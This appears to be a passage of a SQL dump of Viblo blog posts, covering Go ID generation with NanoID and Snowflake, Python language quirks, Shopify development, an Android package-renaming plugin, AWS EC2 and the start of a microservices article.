> "Nano ID is quite comparable to UUID v4 (random-based). It has a similar number of random bits in the ID (126 in Nano ID and 122 in UUID), so it has a similar collision probability -- for there to be a one in a billion chance of duplication, 103 trillion version 4 IDs must be generated"

Theo NanoID thì nếu bạn sử dụng chế độ Standard với chiều dài 21 ký tự thì mỗi 1.000.000 (1 triệu) reuquest mỗi giấy thì bạn cần hơn 40.000 năm để có 1% tỉ lệ trùng lặp.

Dưới đây là hình về tính toán khả năng trùng lặp của một tool khác của NanoID. ảo ha =))).
![Screenshot 2023-02-06 at 16.47.00.png](https://images.viblo.asia/55d54be5-3f15-4d4c-ab19-df02ddb0b6f9.png)

thường nếu bạn chỉ muốn dùng số không thôi từ khả năng trùng sẽ tăng lên khá nhiều, tuy nhiên nếu bạn cần sinh ID cho 1 tỉ request mỗi giây thi quên NanoID đi, còn vài chục nghìn thâm trí vài trăn nghìn thì NanoID vẫn rất tuyệt.

Ví dụ bằng Golang nhen.

```
func main() {

	canonicID, err := nanoid.Standard(21)
	if err != nil {
		panic(err)
	}
	id1 := canonicID()
	log.Printf("ID 1: %s", id1)
	// Makes sense to use CustomASCII since 0-9 is ASCII.
	decenaryID, err := nanoid.CustomASCII("0123456789", 12)
	if err != nil {
		panic(err)
	}
	id2 := decenaryID()
	log.Printf("ID 2: %s", id2)
}

```

và đây là kết quả
![Screenshot 2023-02-07 at 09.35.45.png](https://images.viblo.asia/a0ad469a-394a-4ec4-9b91-9b6362c79509.png)

```
log.Printf("time start: %s", time.Now())
	for i := 0; i < 10000000; i++ {
		nanoid.Standard(21)
	}
	log.Printf("end start: %s", time.Now())
```

mình có thử thêm genera ra 10 triệu mã dài 21 ký tự và hết khoảng 31 giây. với việc xử lý tuần tự thì mình thấy tốc độ rất ổn.

OK! giờ test cường độ cao xem có bị trùng không nào.

Case 1: tạo tuần từ 10 triệu mã
![Screenshot 2023-02-07 at 09.41.19.png](https://images.viblo.asia/62dd2113-1737-47c2-8410-c52f937966eb.png)

```
m := make(map[string]int)
	log.Printf("time start: %s", time.Now())
	for i := 0; i < 10000000; i++ {
		canonicID, err := nanoid.Standard(21)
		if err != nil {
			panic(err)
		}
		m[canonicID()] = 1
	}
	log.Printf("end start: %s", time.Now())
	log.Printf("total: %d", len(m))
```

![Screenshot 2023-02-07 at 10.22.11.png](https://images.viblo.asia/54f33d1d-83ec-49af-b434-451548d242e2.png)


Case 2: giả lập 100 request cùng tạo, mỗi request tạo 1000 mã và woww, không phát hiện trùng lặp.
```
func main() {
	wg := &sync.WaitGroup{}
	wg.Add(1000)
	total := 0
	startTime := time.Now()
	for i := 0; i < 1000; i++ {
		fmt.Println("* create chanel ", i)
		count := make(chan int)
		go Standard(count, wg, &total)
	}
	wg.Wait()
	log.Printf("total: %d", total)
	log.Printf("start time : %s, end time %s", startTime, time.Now())
}

func Standard(ch chan int, wg *sync.WaitGroup, total *int) {
	m := make(map[string]int)
	for i := 0; i < 10000; i++ {
		canonicID, err := nanoid.Standard(21)
		if err != nil {
			panic(err)
		}
		m[canonicID()] = 1
	}
	*total += len(m)
	wg.Done()
	ch <- len(m)
}
```

![Screenshot 2023-02-07 at 10.55.57.png](https://images.viblo.asia/c5940231-d81f-4969-b2a4-4e9b43c8ff16.png)

Case 3: tạo 1 triệu channel, mỗi channel 100 request.<br />
à à, code trển các bạn edit xíu rồi test thử nhé, máy mình không chạy nổi :(.<br>

Trong một số trường hợp lập trình viên cần một ID có khả năng tăng dần thì trường hợp này NanoID có lẽ sẽ không còn được ưu tiên sử dụng đặc biệt với những hệ thống phân tán sẽ làm bài toán thật sự gian nan, Tuy nhiên xét trường hợp mã ngẫu nhiên NanoID vẫn rất đáng cân nhắc.

# Distributed ID generator
như mình đã đều cập ở phần **ID generator** phía trên, sẽ khá nhiều bất cập nếu dùng bộ tăng dần của DB, đặc biệt với những hệ thống phân tán sẽ làm bài toán thật sự gian nan.

Thuật toán [snowflake](https://developer.twitter.com/en/docs/twitter-ids) của Twitter là giải pháp điển hình trong ngữ cảnh này
![image.png](https://images.viblo.asia/ecb36cf4-3bec-43a7-bfed-304f7cdede2b.png)

Mã do thuật toán Snowflale tạo ra với giá trị 64-bit và được chia thành bốn phần:
+ Không sử dụng bit đầu tiên vì bit này là bit dấu.
+ timestamp: sử dụng 41 bit để biểu thị timestamp khi nhận được yêu cầu, tính bằng milliseconds.
+ datacenter_id: 5 chữ số để biểu thị id của trung tâm dữ liệu.
+ worker_id: 5 chữ số để biểu thị id của server.
+ sequence_id: cuối cùng là id tăng vòng lặp 12 bit ( tăng từ 0 đến 111111111111 rồi trở về 0).

Với cơ chế này snowfllake có thể tạo ra `2 ^ 12 = 4096` mỗi millisecond hoặc khoảng 4,096 triệu mỗi giây trên mỗi server.<br>
`timestamp` lưu trữ 41 bits, vì thế theo tính toán, nó sẽ chỉ hoạt động được đến `2039/9/7 23:47:35`

`timestamp`, `datacenter_id`, `worker_id` và `sequence_id` là bốn trường, riêng timestamp và sequence_id được tạo bởi chương trình khi chạy. Còn datacenter_id và worker_id cần lấy trong giai đoạn triển khai và khi chương trình đã được khởi động, nó không thể thay đổi.


Chúng ta vô demo thôi nhé, hôm nay chúng ta lại Golang tiếp nhỉ :D

lib: https://github.com/bwmarrin/snowflake

```
func main() {
	n, err := snowflake.NewNode(1)
	if err != nil {
		println(err)
		os.Exit(1)
	}

	for i := 0; i < 10; i++ {
		// tạo ID
		id := n.Generate()
		fmt.Println("id", id)
		fmt.Println(
			"node: ", id.Node(),
			"step: ", id.Step(),
			"time: ", id.Time(),
			"\n",
		)
	}
}
```

![Screenshot 2023-02-07 at 11.41.45.png](https://images.viblo.asia/a8a833ba-2614-4cb0-9c93-84a0487d1dec.png)

ID được tạo ra một cách tuần tự, quá đỉnh phải ko.

Tiếp theo mình giả lập có 4 node, mỗi node có 10 request.

```
func main() {
	wg := &sync.WaitGroup{}
	wg.Add(4)
	for i := 0; i < 4; i++ {
		fmt.Println("* create chanel ", i)
		go gen(i, wg)

	}
	wg.Wait()
}
func gen(node int, wg *sync.WaitGroup) {
	n, err := snowflake.NewNode(int64(node))
	if err != nil {
		println(err)
		os.Exit(1)
	}
	for i := 0; i < 10; i++ {
		// tạo ID
		id := n.Generate()
		fmt.Println(
			"id: ", id,
			"node: ", id.Node(),
			"step: ", id.Step(),
			"time: ", id.Time(),
			"\n",
		)
	}
	wg.Done()
}
```

bạn có thể xem hình kiểm tra kết quả hoặc coppy code về thử nhé

![Screenshot 2023-02-07 at 11.46.12.png](https://images.viblo.asia/2f4c9db0-4ca1-4009-943c-7eb3ed9d4fa9.png)

và đương nhiên ngoài việc sử dụng bạn còn có thể Custom lại vài thứ cho phù hợp như Epoch, NodeBits, StepBits...

Nhưng 2039 thì có quá ngắn với bạn không? nếu ngắn quá thì Sonyflake là giải pháp thay thế, Sonyflake có thiết kế rất giống Snowflake, tuy nhiên khác ở cách phân bố bits.
![image.png](https://images.viblo.asia/e99f6510-138a-444a-80a8-d992a9549707.png)
Thời gian ở đây chỉ sử dụng 39 bit, nhưng đơn vị thời gian trở thành 10ms. Về mặt lý thuyết, nó dài hơn thời gian của snowflake chuẩn đến 41 bit (174 năm).

Sequence ID của Sonyflake tương đồng với Snowflake còn Machine ID là id của Node.
Sự khác biệt giữa sonyflake là các tham số cấu hình trong quá trình khởi động (xem thêm tại: https://github.com/sony/sonyflake)

# Reference
https://developer.twitter.com/en/docs/twitter-ids<br>
https://github.com/matoous/go-nanoid<br>
https://github.com/bwmarrin/snowflake<br>
https://github.com/sony/sonyflake<br>
https://zalopay-oss.github.io/', '2023-02-07T04:59:42.000000Z', '2023-02-28T05:00:16.000000Z', '2023-02-16T03:41:03.000000Z'),
	('Python: Các tính năng vi diệu của Python (P1)', '0gdJzQ2A4z5', '8', 'public', '', '
<strong>Ảnh từ hackermoon.com</strong>
<br>
Python làm một ngôn ngữ khá dễ tiếp cận cho người mới tuy nhiên thì với Python thì cũng có khá nhiều thứ khá nhì nhằng và bài viết này sẽ giúp các bạn hiểu thêm về mấy cái nhì nhằng này. Dưới đây là một số tính năng khá vi diệu có trong Python (Lưu ý đây là tính năng chứ không phải bug).

1. Cấu trúc for-else.
Nhiều ngôn ngữ lập trình có cấu trúc if-...', '![image.png](https://images.viblo.asia/c3dcf302-73a3-4956-94f5-0f48d851f890.png)
<div align="center"><strong>Ảnh từ hackermoon.com</strong>
</div><br>
Python làm một ngôn ngữ khá dễ tiếp cận cho người mới tuy nhiên thì với Python thì cũng có khá nhiều thứ khá nhì nhằng và bài viết này sẽ giúp các bạn hiểu thêm về mấy cái nhì nhằng này. Dưới đây là một số tính năng khá vi diệu có trong Python (Lưu ý đây là tính năng chứ không phải bug).

### 1. Cấu trúc for-else.
Nhiều ngôn ngữ lập trình có cấu trúc `if-else` để xử lý các câu lệnh điều kiện. Tuy nhiên, trong Python, bạn thậm chí có thể sử dụng câu lệnh `else` mà không cần `if`.
```
animals = ["Dog", "Cat", "Pig"]

for animal in animals:
    if animal == "Chicken":
        print("Chicken is an animal!")
        break
else:
    print("Not found Chicken!")

# Not found Chicken!
```
Ví dụ, đoạn mã trên không có câu lệnh `if`. Nhưng khối mã bên dưới câu lệnh `else` đã được thực thi thành công!

Đây là cú pháp  `for-else`  trong Python.

Đó là một tính năng kỳ lạ và chúng ta nên cẩn thận khi sử dụng nó. Nhưng ý tưởng của nó lại đơn giản đến không ngờ:

> Khối `else` sẽ được thực thi khi vòng lặp `for` chạy mà không gặp `break`.

Để chứng minh điều này, hãy xem xét đoạn code sau:
```
animals = ["Dog", "Cat", "Pig", "Chicken"]

for animal in animals:
    if animal == "Chicken":
        print("Chicken is an animal!")
        break
else:
    print("Not found Chicken!")

# Chicken is an animal!
```
Khi chạy đoạn code trên, danh sách `animals` chứa “Chicken” vì vậy, vòng lặp `for` đã bị `break` và câu lệnh `else` không được thực thi.
### 2. Thay đổi Tuples trong Python ?
Như đã biết thì tuples là immutable Python objects (tức là đối tượng không thể thay đổi được). Tuy nhiên thì có một mẹo có thể tạm coi là thay đổi tuples mặc dù thực tế thì bản chất tuples không hề thay đổi.

Nhưng theo cách dưới đây thì ta có thể tạm coi là tuples được thay đổi.
```
tp = ([1, 2, 3], 4, 5)
tp[0].append(4)
print(tp)
# ([1, 2, 3, 4], 4, 5)
```
giải thích cho điều này thì `tp` là một  immutable Python objects (bất biến). Tuy nhiên, phần tử đầu tiên trong tp là một `list` có thể thay đổi được. Khi này, phần tử đầu tiên của `tp` sẽ trỏ vào địa chỉ ô nhớ lưu trữ `list` mà có giá trị là `[1, 2, 3]` ban đầu. Khi ta thay đổi giá trị của phần tử đầu tiên thì `tp` không đổi tuy nhiên thì ta vẫn có thể coi là `tp` thay đổi (thay đổi về mặt giá trị trả ra). Các bạn có thể xem xét ví dụ dưới đây để thấy rõ hơn:
```
a = [1, 2, 3]
tp = (a, 4, 5)
print(id(a) ==id(tp[0]))
# True
a.append(4)
print(id(a) == id(tp[0]))
print(tp)
# True
# ([1, 2, 3, 4], 4, 5)
```
### 3. 256 là 256, nhưng đôi khi 257 không phải 257
Ngạc nhiên chưa, đây là một tính năng ảo diệu của python chứ hoàn toàn không phải lỗi. Khi chạy ví dụ dưới đây với `python shell` thì  kết quả trả ra sẽ khiến bạn bất ngờ.
```
>>> a=256
>>> b=256
>>> a is b
True
>>> x = 257
>>> y = 257
>>> print(x is y)
False
>>>
```
Về cơ bản, Python tải trước tất cả các số nguyên nhỏ trong phạm vi `[-5, 256]` để tiết kiệm thời gian và chi phí bộ nhớ. Do đó, khi một số nguyên trong phạm vi này được khai báo, Python chỉ tham chiếu số nguyên được lưu trong bộ nhớ cache và sẽ không tạo bất kỳ đối tượng mới nào.  Với mỗi dòng code là một câu lệnh hoàn toàn khác, được phân tích cú pháp và biên dịch riêng, do đó xảy ra trường hợp như trên.

Trong một từ, `a` và `b` là cùng một đối tượng, nhưng `x` và `y` là hai đối tượng khác nhau.
```
>>> id(a)
1696073345424
>>> id(b)
1696073345424
>>> id(x)
1696122928496
>>> id(y)
1696122928752
```
Cơ chế này trong Python được gọi là `integer interning` hoặc `integer caching`.
Đấy là khi chúng ta viết code trong python shell thì sẽ xảy ra trường hợp này còn khi chúng ta viết chúng trong cùng 1 file, cùng một ngữ cảnh (context), trình biên dịch (complier) thì sẽ không xảy ra trường hợp này.
### 4. String interning
> **String interning** làm cho các hoạt động xử lý chuỗi phổ biến tiết kiệm thời gian và không gian bằng cách lưu chúng vào bộ nhớ đệm. Thay vì mỗi lần tạo một bản sao mới của chuỗi, phương pháp tối ưu hóa này yêu cầu chỉ giữ một bản sao của chuỗi cho mọi giá trị riêng biệt bất biến thích hợp và sử dụng tham chiếu con trỏ ở bất kỳ đâu được gọi.
```
x = "This is a string"
y = "This is a string"
print(x is y)  # prints True
```
Toán tử` is` trong Python được sử dụng để kiểm tra xem hai đối tượng có tham chiếu đến cùng một vị trí bộ nhớ hay không. Nếu nó trả về `True`, điều đó có nghĩa là hai đối tượng thực sự là cùng một đối tượng. Tong đoạn code trên, thay vì tạo một bản sao mới khi `y` được gán cho một chuỗi có cùng giá trị với `x`,  Python trỏ đến cùng một chuỗi được gán cho `x`. Điều này chỉ đúng với các chuỗi nhỏ hơn; các chuỗi lớn hơn sẽ tạo các bản sao riêng lẻ như bình thường.
```
x = "This is a string" * 300
y = "This is a string" * 300
print(x is y)  # False
```
Điều này sẽ in ra `False` trên `console` và các chuỗi không được interning. Và dưới đây là giải pháp:
```
import sys
x = sys.intern("This is a string" * 300)
y = sys.intern("This is a string" * 300)
print(x is y)  # True
```
### 5. 0.1+0.2 is not 0.3

Trong thực tế thì mọi người đều biết là` 0.1 + 0.2 = 0.3` tuy nhiên thì Python lại không nghĩ như vậy:
```
print(0.1+0.2==0.3)
print(0.1+ 0.2)
# False
# 0.30000000000000004
```
Thực tế mà nói, đây không phải là lỗi của `Python`. Không máy tính nào có thể tính toán giá trị `float` một cách chính xác.

Máy tính chỉ có thể lưu trữ và xử lý các số thực với độ chính xác nhất định. Vì vậy, các hoạt động của `float` dựa vào việc triển khai phần cứng trong chip xử lý của máy và không có ngôn ngữ lập trình nào có thể chắc chắn rằng các phép tính với `float` luôn được tính đúng.

tags: Python, Python cơ bản, python tips, python trick, python tuple, for-else in python

### Nguồn:
* https://stackoverflow.com/questions/15171695/whats-with-the-integer-cache-maintained-by-the-interpreter
* [Medium](https://medium.com/techtofreedom/3-facts-of-the-integer-caching-in-python-20ce587f09bb)
* https://rednafi.github.io/reflections/string-interning-in-python.html', '2023-02-07T03:24:59.000000Z', '2023-02-28T04:13:04.000000Z', '2023-02-23T00:41:45.000000Z'),
	('Tìm hiểu về lập trình trên nền tảng Shopify', 'MkNLrOlOVgA', '9', 'public', 'https://images.viblo.asia/1c2507bb-4450-4b55-a650-8a3dc10470c1.png', 'Shopify - nền tảng thương mại điện tử hàng đầu thế giới
Shopify  là một nền tảng thương mại điện tử (Ecommerce) – nơi người dùng có thể tạo cửa hàng online tích hợp việc đăng dịch vụ / sản phẩm, xử lý đơn hàng, tính năng giỏ hàng & thanh toán và liên kết với mạng xã hội. Shopify hiện nay đang phát triển nhanh chóng trên thế giới và được tin dùng bởi hàng triệu người dùng. Bạn có thể xem biểu đồ...', '# Shopify - nền tảng thương mại điện tử hàng đầu thế giới
**[Shopify](https://www.shopify.com/vn)**  là một nền tảng thương mại điện tử *(Ecommerce)* – nơi người dùng có thể tạo cửa hàng online tích hợp việc đăng dịch vụ / sản phẩm, xử lý đơn hàng, tính năng giỏ hàng & thanh toán và liên kết với mạng xã hội. Shopify hiện nay đang phát triển nhanh chóng trên thế giới và được tin dùng bởi hàng triệu người dùng. Bạn có thể xem biểu đồ phát triển User của Shopify dưới đây:
   ![image.png](https://images.viblo.asia/1c2507bb-4450-4b55-a650-8a3dc10470c1.png)

  Qua hình ảnh trên chúng ta có thể thấy Shopify đã phát triển chỉ với 5 năm đã có 140 triệu User hoạt động và có 50 triệu tài khoản Premium.
  Đây là một hình ảnh chứng minh cho sự phát triển của Shopify trên thế giới.
  Cùng với sự phát triển nhanh chóng của Shopify. Công việc của lập trình viên đối với Shopify cũng phát triển. Chúng ta có thể xây dựng Website trên nền tảng Shopify hay lập trình các ứng dụng phục vụ người bán hàng. Nếu các bạn đã quen làm việc với WordPress, thì việc làm quen với Shopify sẽ rất dễ dàng. Sau đây tôi sẽ giới thiệu các công việc lập trình viên có thể làm với Shopify.

  ## 1. Tạo một trang Web thương mại điện tử đơn giản với Shopify
  Tương tự với WordPress, Shopify cũng cần cài đặt theme để tạo ra 1 trang web bán hàng cho khách hàng. Việc này các bạn có thể chọn 1 theme trong chợ ứng dụng của Shopify hay 1 theme mặc định được cung cấp miễn phí bới Shopify. Ae lập trình viên sẽ giúp khác hàng của mình cài đặt và tùy chình theo ý muốn của khách hàng.

  ![image.png](https://images.viblo.asia/81aee3e1-8f97-4801-a1fc-d97b9bbcaf58.png)

 Đây là giao diện  trang chủ Shopify của tôi. Các bạn chỉ cần click nút ADD để cài đặt 1 theme miễn phí bởi Shopify. Từ đó bạn đã có 1 trang web bán hàng cho riêng mình.
  ![image.png](https://images.viblo.asia/0404b7a5-7de4-447c-97fe-d85a2757fbd6.png)
  Khi theme được cài đặt xong, bạn chỉ cần thêm dữ liệu sản phẩm của bạn vào trang Products của Shopify là bạn đã có 1 trang web bán hàng cho riêng mình. Quá đơn giản, đây chính là ưu điểm của Shopify đối với các nền tảng khác.
  ![image.png](https://images.viblo.asia/56ec17b1-5adf-4e38-b250-e2307051fccd.png)
  Hãy xem chúng ta có gì với 3 cú click chuột trên Shopify
  ![image.png](https://images.viblo.asia/61d86587-0476-44bb-a603-f2576aa8efdf.png)

  Trang chủ
  ![image.png](https://images.viblo.asia/3146d9d7-7f4f-4f3b-8448-143651e8c84e.png)
<div align="center">
 *Trang sản phẩm* </div>

Quá dễ để tạo 1 trang web, ngay cả người dùng không có kiến thức về lập trình cũng có thể tạo trang web cho riêng mình.
Lập trình viên có thể tạo ra các theme riêng và bán trên chợ của Shopify. Mỗi theme ở đây có thể có giá trung bình từ 100-300USD. Thật tuyệt vời khi bạn có thể bán theme trên nền tảng này.
## 2. Trở thành Shopify Partner
Shopify Partner chính là cộng tác viên của Shopify. Ở đây bạn có thể phát triển các ứng dụng hay các theme của shopify
![image.png](https://images.viblo.asia/29290f06-ba4c-4ed5-9000-c6d507882c2c.png)
### 2.1 Phát triển theme cho Shopify
Theme được viết bởi ngôn ngữ lập trình Ruby với đuôi file là .liquid. <br>
Theme được cấu trúc bởi các thư mục mặc định đã được định nghĩa sẵn của Shopify. Bạn cần phát triển theme theo đúng cấu trúc đó, khi có lỗi thì sẽ không thể import theme mà bạn đang phát triển vào cửa hàng của Shopify.
Cấu trúc của theme như sau
```
.
├── assets
├── config
├── layout
├── locales
├── sections
├── snippets
└── templates
    └── customers

```
Mỗi thư mục sẽ chứa các file có chức năng riêng của nó.<br>
1. Assets: thư mục chứa tất cả các tài nguyên của theme như ảnh, các file CSS, các file JavaScript.
2. Config: thư mục chứa các cài đặt của theme và dữ liệu được lấy từ theme Editor
3. Layout: Chứa các file bố cục là theme render
4. Locales: thư mục chứa các file hỗ trợ dịch nội dung website của bạn thành nhiều ngôn ngữ khác nhau
Thông tin chi tiết bạn tham khảo[ tại đây](https://shopify.dev/themes/architecture).
### 2.2 Phát triển ứng dụng cho Shopify
![image.png](https://images.viblo.asia/5469c302-00ac-484d-a5c0-3cea9aa6c149.png)

Ví dụ 1 app review sản phẩm đơn giản với gía 9.99$/tháng đã có hơn 100.000 cửa hàng trên Shopify tin dùng và gần 11k đánh giá tốt trên chợ ứng dụng của Shopify.
## 3. [DropShiping](https://vietnix.vn/dropshipping-la-gi/?gclid=Cj0KCQiA54KfBhCKARIsAJzSrdoIFEGt7wSeoRApRaipvj5pxoLsI_h9naPa7WEsAY0ALit8n4Zk1VAaAla6EALw_wcB) trên Shopify
Shopify hỗ trợ DropShiping rất hiệu quả.
[Dropshipping](https://vietnix.vn/dropshipping-la-gi/?gclid=Cj0KCQiA54KfBhCKARIsAJzSrdoIFEGt7wSeoRApRaipvj5pxoLsI_h9naPa7WEsAY0ALit8n4Zk1VAaAla6EALw_wcB) hay Dropship là một trong những phương pháp làm MMO, đây là mô hình kinh doanh bán lẻ mà trong đó một doanh nghiệp không giữ các sản phẩm mà họ bán trong kho. Khi một nhà bán lẻ Dropshipping bán một sản phẩm, họ sẽ mua sản phẩm đó trực tiếp từ một bên thứ ba (nhà sản xuất, nhà bán buôn hoặc một nhà bán lẻ khác) rồi giao sản phẩm đó trực tiếp cho khách hàng.
## 4. Hỗ trợ SEO hiệu quả
Shopify kết hợp các phương pháp SEO trên Facebook, Tiktok... các nền tảng khác rất dễ dàng. Việc này sẽ tối ưu chi phí quảng cáo và lợi nhuận của bạn.
## 5. Kết luận
Shopify đang là xu hướng của thế giới và cũng sẽ là xu hướng của Việt Nam trong tương lai. Ae lập trình viên hay người bán hàng hãy tìm hiểu và make money trên nền tảng này.
Nếu thấy hay các bạn hãy comment phía dưới, mình sẽ làm hướng dẫn chi tiết về Shopify trong bài viết tiếp theo.', '2023-02-06T15:42:46.000000Z', '2023-02-28T03:39:05.000000Z', '2023-02-07T04:55:04.000000Z'),
	('Thay đổi Package Name của Android Studio dể dàng với plugin APR', 'obA466rM4Kv', '10', 'public', '', 'Nếu bạn đang gặp khó khăn hoặc bế tắc trong việc thay đổi package name trong Android Project, bạn cần một giải pháp nhanh chóng và dễ dàng thì đây là cách dành cho bạn.

Trong Android Studio có chứng năng khá hay đó chính là refactor. Nó có thể chỉnh sửa mọi thứ một cách an toàn trong project Android của bạn. Nhưng nó lại không cung cấp cho chúng ta chức năng refactor package name của một proje...', 'Nếu bạn đang gặp khó khăn hoặc bế tắc trong việc thay đổi package name trong Android Project, bạn cần một giải pháp nhanh chóng và dễ dàng thì đây là cách dành cho bạn.

Trong Android Studio có chứng năng khá hay đó chính là refactor. Nó có thể chỉnh sửa mọi thứ một cách an toàn trong project Android của bạn. Nhưng nó lại không cung cấp cho chúng ta chức năng refactor package name của một project.

Lấy vị dụ: bạn không thể thay đổi package name của chúng ta từ com.android.myapplication -> com.nickseven.phucvr.product.

Để giải quyết trường hợp này thì có rất nhiều cách: từ giải quyết thủ công, đến một vài thủ thuật để nhanh gọn hơn. Nhưng với bài viết này, mình xin giới thiệu với các bạn một plugin giúp các bạn tự động hóa việc thay đổi package name vừa an toàn và vừa nhanh chóng. Một điều tự hào nho nhỏ, mình là tác giả của plugin này, mong các bạn ủng hộ và góp phần giúp nó phát triển hơn trong tương lai. Plugin này có tên là Android Package Renamer

![Android_Package_Renamer.png](https://images.viblo.asia/5cdd3b6b-6825-40ce-9fb5-41dbeffecf87.png)


## Cài đặt

- Sử dụng chợ plugin của Intellij IDE hoặc Android Studio:

` Settings/Preferences  > Plugins  > Marketplace  > Search for "Android Package Renamer" > Install Plugin`

- Sử dụng local:

 Tải  [phiên bản mới nhất](https://github.com/nguyenphuc22/Android-Package-Renamer/releases/latest) và cài đặt bằng cách mở Intellij Hoặc Android Studio:

` Settings/Preferences  > Plugins  > ⚙️  > Install plugin from disk...`

![Install.gif](https://images.viblo.asia/fb7c74f6-955c-411e-8419-28c1d53401e4.gif)

## Cách sử dụng

1. Mở project của bạn.
2. Chọn -&gt; **File** -&gt; **Rename Package**
3. **Nhập tên package** bạn muốn thay đổi.
4. Chọn **Ok**.
5. Chọn **Sync Project with Gradle Files** or **Invalidate Caches**

![use1.gif](https://images.viblo.asia/476cd500-31c0-43d5-990b-d01860086d24.gif)

Như vậy là các bạn có thể thay đổi package name project của mình một cách dễ dàng rồi. Nếu các bạn thấy plugin này hữu ích, cho mình xin một ngôi sao trên [github](https://github.com/nguyenphuc22/Android-Package-Renamer) nhé.', '2023-02-06T15:19:02.000000Z', '2023-02-27T08:50:09.000000Z', '2023-02-06T15:51:30.000000Z'),
	('Blog#132: AWS EC2を紹介する概要', '0gdJzQWE4z5', '11', 'public', 'https://images.viblo.asia/c3d450c5-21f7-493d-999c-40897cb85651.png', '

この記事の主な目的は、日本語レベルを上げるのを手伝うことです。ソフトウェア開発に関連する概念や知識なとを紹介するために簡単な日本語を使います。ITの知識に関しては、インターネット上でもっとよく説明されているかもしれませんが、この記事の主な目標はまだ日本語を学ぶことです。

こんにちは、私はトゥアンと申します。東京からフルスタックWeb開発者です。
将来の有用で面白い記事を見逃さないように、私のブログをフォローしてください。

導入
可変サイズのコンピューターを使って、安全にあらゆる種類の作業を行うことができます。

Amazon Elastic Compute Cloud（Amazon EC2）は、500以上のインスタンスから選択できる最新のプロセッサ、ストレージ、ネットワーク、オペレーティングシステム、購入モデルを提供し、ワークロードのニーズに最適なコンピューティングプラットフ...', '![image.png](https://images.viblo.asia/c3d450c5-21f7-493d-999c-40897cb85651.png)

> この記事の主な目的は、[日本語](https://viblo.asia/s/-E1XVOWqNVMz)レベルを上げるのを手伝うことです。ソフトウェア開発に関連する概念や知識なとを紹介するために[簡単な日本語](https://viblo.asia/s/-E1XVOWqNVMz)を使います。ITの知識に関しては、インターネット上でもっとよく説明されているかもしれませんが、この記事の主な目標はまだ[日本語を学ぶ](https://viblo.asia/s/-E1XVOWqNVMz)ことです。
-----
こんにちは、私は[トゥアン](https://tuan-portfolio.web.app/#/)と申します。東京からフルスタックWeb開発者です。
将来の有用で面白い記事を見逃さないように、私のブログをフォローしてください。

# 導入
可変サイズのコンピューターを使って、安全にあらゆる種類の作業を行うことができます。

Amazon Elastic Compute Cloud（Amazon EC2）は、500以上のインスタンスから選択できる最新のプロセッサ、ストレージ、ネットワーク、オペレーティングシステム、購入モデルを提供し、ワークロードのニーズに最適なコンピューティングプラットフォームを提供します。インテル、AMD、Armのプロセッサに対応した最初の大手クラウドプロバイダーであり、オンデマンドのEC2 Macインスタンスを備えた唯一のクラウドであり、400G bpsのイーサネットネットワークを備えた唯一のクラウドです。機械学習のトレーニングで最高のコストパフォーマンスを実現し、1つの推論インスタンスあたりのコストもクラウドの中では最も低く抑えられています。AWSでは、他のクラウドよりも多くのSAP、ハイパフォーマンスコンピューティング（HPC）、機械学習、およびWindowsのワークロードが実行されています。

# 機能
* 信頼性の高い、スケーラブルなオンデマンドのインフラストラクチャにアクセスできます。99.99％の可用性を保証するSLA（サービスレベルアグリーメント）により、容量を数分でスケールできます。
* アプリケーションを安全に使えるようにするため、Amazon EC2の基盤にAWS Nitro Systemを組み込んでいます。
* AWS Graviton ベースのインスタンスやAmazon スポットインスタンス、AWS Savings Plansなどを使うことで、パフォーマンスとコストを最適化できます。
* AWSの移行ツール、AWSのマネージドサービス、Amazon Lightsailを使えば、アプリケーションの移行や構築を簡単に行うことができます。AWSができることを見てみましょう！

# ユースケース
## クラウドネイティブおよびエンタープライズアプリケーションの実行
Amazon EC2は、セキュアで信頼性の高い、高性能で費用対効果の高いコンピューティングインフラストラクチャを提供することで、高い要求を満たすビジネスニーズを支援します。

## HPCアプリケーションのためのスケール
HPCアプリケーションを効率的に実行するために、必要なときに使えるインフラストラクチャや容量にアクセスできます。

### HPCとは？
高性能コンピューティング（HPC - High Performance Computing）アプリケーションとは、大量のデータを処理するために複数のコンピューターを使用するソフトウェアのことです。HPCアプリケーションを使用すると、複雑な計算を短時間で実行できます。

## Appleプラットフォーム向けの開発
macOSのアプリケーションを簡単に構築、テスト、署名することができます。数分で環境にアクセスでき、必要なときに容量を変えることができ、AWSの従量制料金を活用できます。

## 機械学習アプリケーションのトレーニングとデプロイ
Amazon EC2は、機械学習プロジェクトの料金とパフォーマンスを最適化するために、コンピューティング、ネットワーク（最大400Gbps）、そしてストレージサービスの多くの選択肢を提供します。

# 最後

この記事では、AWS EC2を最も簡単な方法で概要を紹介します。将来的には、特定のユースケースについてのより詳しいAWS EC2の記事を提供します。

いつもお世話になっています。この記事を楽しんで、新しいことを学べたら嬉しいです。

今度の記事でお会いしましょう！この記事が気に入ったら、私を応援するために「LIKE」を押して登録してください。ありがとうございました。

-----
> この記事の主な目的は、[日本語](https://viblo.asia/s/-E1XVOWqNVMz)レベルを上げるのを手伝うことです。ソフトウェア開発に関連する概念や知識なとを紹介するために[簡単な日本語](https://viblo.asia/s/-E1XVOWqNVMz)を使います。ITの知識に関しては、インターネット上でもっとよく説明されているかもしれませんが、この記事の主な目標はまだ[日本語を学ぶ](https://viblo.asia/s/-E1XVOWqNVMz)ことです。

# Resource
* https://tuan200tokyo.blogspot.com/2023/02/blog132-aws-ec2.html', '2023-02-06T09:44:31.000000Z', '2023-02-24T15:00:10.000000Z', '2023-02-09T01:07:07.000000Z'),
	('Chuyển đổi từ monolith sang microservices qua ví dụ', 'obA466rG4Kv', '1', 'public', 'https://images.viblo.asia/be4d572b-c6b6-4b76-92bf-2ee5531e3af4.png', '1. Why microservices?
Microservices là kiến trúc hệ thống phần mềm hướng dịch vụ, chia nhỏ hệ thống ra thành các dịch vụ nhỏ, isolate về business và dữ liệu. Microservices đã trở nên phổ biến trong những năm trở lại đây, với những ưu điểm nổi bật, nó đang thay thế các ứng dụng monolith. Một số đặc trưng của microservices như sau.

- Triển khai độc lập

Nhờ chia nhỏ 1 ứng dụng lớn ra làm nhiều ứ...', '## 1. Why microservices?
Microservices là kiến trúc hệ thống phần mềm hướng dịch vụ, chia nhỏ hệ thống ra thành các dịch vụ nhỏ, isolate về business và dữ liệu. Microservices đã trở nên phổ biến trong những năm trở lại đây, với những ưu điểm nổi bật, nó đang thay thế các ứng dụng monolith. Một số đặc trưng của microservices như sau.

**- Triển khai độc lập**

